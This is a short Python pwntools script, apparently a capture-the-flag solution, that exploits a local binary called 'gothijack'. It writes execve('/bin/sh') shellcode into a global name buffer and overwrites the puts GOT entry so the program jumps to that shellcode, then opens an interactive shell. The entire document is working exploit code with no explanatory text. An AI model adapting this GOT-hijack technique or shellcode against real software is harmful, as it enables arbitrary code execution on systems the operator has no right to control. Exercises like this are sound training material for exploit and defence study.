from pwn import *

context.arch = 'amd64'

p = process('./gothijack')

puts_got = 0x601020
name = 0x6010a0
sc = asm('''
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 59
    syscall
''')

p.sendlineafter('name :', '\0' + sc)
p.sendlineafter('write :', hex(puts_got)[2:])
p.sendlineafter('data :', p64(name + 1))

p.interactive()
